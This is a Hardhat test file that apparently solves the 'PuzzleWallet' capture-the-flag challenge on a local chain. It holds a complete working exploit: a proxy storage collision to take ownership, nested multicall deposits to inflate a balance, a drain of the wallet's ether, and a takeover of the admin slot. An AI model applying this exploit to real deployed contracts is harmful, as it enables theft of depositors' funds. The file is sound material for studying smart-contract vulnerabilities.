import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract, ContractFactory } from 'ethers';
import { ethers } from 'hardhat';

const { provider, utils } = ethers;

const MAX_BALANCE = utils.parseEther('100');

describe('PuzzleWallet', () => {
  let owner: SignerWithAddress;
  let admin: SignerWithAddress;
  let friend1: SignerWithAddress;
  let friend2: SignerWithAddress;
  let friend3: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  let PuzzleWalletFactory: ContractFactory;
  let PuzzleProxyFactory: ContractFactory;

  before(async () => {
    [attacker, owner, admin, friend1, friend2, friend3] =
      await ethers.getSigners();

    [PuzzleWalletFactory, PuzzleProxyFactory] = await Promise.all([
      ethers.getContractFactory('PuzzleWallet'),
      ethers.getContractFactory('PuzzleProxy'),
    ]);

    // 1 - deploy implementation
    const puzzleWallet = await PuzzleWalletFactory.connect(owner).deploy();
    await puzzleWallet.deployed();

    const iface = new ethers.utils.Interface(['function init(uint256)']);
    const data = iface.encodeFunctionData('init', [MAX_BALANCE]);

    // 2 - deploy proxy
    const puzzleProxy = await PuzzleProxyFactory.connect(owner).deploy(
      admin.address,
      puzzleWallet.address,
      data
    );
    await puzzleProxy.deployed();

    // 3 - whitelist users
    contract = PuzzleWalletFactory.attach(puzzleProxy.address);
    let [tx1, tx2, tx3] = await Promise.all([
      contract.connect(owner).addToWhitelist(friend1.address),
      contract.connect(owner).addToWhitelist(friend2.address),
      contract.connect(owner).addToWhitelist(friend3.address),
    ]);
    await Promise.all([tx1.wait(), tx2.wait(), tx3.wait()]);

    /// 4 - deposit ethers to wallet
    [tx1, tx2, tx3] = await Promise.all([
      contract.connect(friend1).deposit({
        value: utils.parseEther('1'),
      }),
      contract.connect(friend2).deposit({
        value: utils.parseEther('5'),
      }),
      contract.connect(friend3).deposit({
        value: utils.parseEther('10'),
      }),
    ]);
    await Promise.all([tx1.wait(), tx2.wait(), tx3.wait()]);
  });

  it('attack', async () => {
    const proxy = PuzzleProxyFactory.attach(contract.address);
    const implementation = PuzzleWalletFactory.attach(contract.address);

    let tx;

    // 1 - Propose new admin -> overwrite owner on puzzle wallet
    expect(await implementation.owner()).to.not.equal(attacker.address);

    tx = await proxy.proposeNewAdmin(attacker.address);
    await tx.wait();

    expect(await implementation.owner()).to.equal(attacker.address);

    // 2 - Add attacker to whitelist
    expect(await implementation.whitelisted(attacker.address)).to.be.false;

    tx = await implementation.addToWhitelist(attacker.address);
    await tx.wait();

    expect(await implementation.whitelisted(attacker.address)).to.be.true;

    // 3 - Multicall of multicalls
    const iface = new ethers.utils.Interface([
      'function multicall(bytes[] calldata)',
      'function deposit()',
    ]);

    const depositData = iface.encodeFunctionData('deposit');

    const multicallData = iface.encodeFunctionData('multicall', [
      [depositData],
    ]);

    tx = await implementation
      .connect(attacker)
      .multicall(
        [
          multicallData,
          multicallData,
          multicallData,
          multicallData,
          multicallData,
          multicallData,
          multicallData,
          multicallData,
          multicallData,
          multicallData,
          multicallData,
          multicallData,
          multicallData,
          multicallData,
          multicallData,
          multicallData,
          multicallData,
        ],
        {
          value: utils.parseEther('1'),
        }
      );
    await tx.wait();

    const attackerBalance = await implementation.balances(attacker.address);
    const contractBalance = await provider.getBalance(implementation.address);

    expect(attackerBalance).to.equal(contractBalance);

    // 4 - Get all contract balance
    tx = await implementation
      .connect(attacker)
      .execute(attacker.address, attackerBalance, depositData);
    await tx.wait();

    expect(await provider.getBalance(implementation.address)).to.equal(0);

    // 5 - setMaxBalance to attacker's address
    tx = await implementation.connect(attacker).setMaxBalance(attacker.address);
    await tx.wait();

    expect(await proxy.admin()).to.equal(attacker.address);
  });
});
